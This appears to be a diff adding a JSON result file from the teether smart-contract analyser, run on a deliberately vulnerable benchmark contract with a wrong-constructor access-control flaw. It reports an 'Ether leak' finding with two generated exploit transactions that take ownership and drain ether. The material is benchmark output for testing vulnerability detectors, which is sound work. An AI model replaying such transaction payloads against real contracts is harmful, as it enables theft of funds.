@@ -1,0 +1,20 @@
+{
+    "errors": [],
+    "fails": [],
+    "findings": [
+        {
+            "exploit": [
+                "eth.sendTransaction({from:\"0x0000000000000000000000000000000000001234\", data:\"0x3e32604860606060606060606060606060606060606060606060606060606060\", to:\"0x0000000000000000000000000000000000001000\", gasPrice:0})",
+                "eth.sendTransaction({from:\"0x0000000000000000000000000000000000001234\", data:\"0x4ddaf8f2f2f2f2f2f2f2f2f2f2f2f2f20000000000000000000000000000000000001234\", to:\"0x0000000000000000000000000000000000001000\", gasPrice:0})"
+            ],
+            "filename": "dataset/access_control/wallet_03_wrong_constructor.rt.hex",
+            "name": "Ether leak"
+        }
+    ],
+    "infos": [],
+    "parser": {
+        "id": "teether",
+        "mode": "runtime",
+        "version": "2022/11/11"
+    }
+}
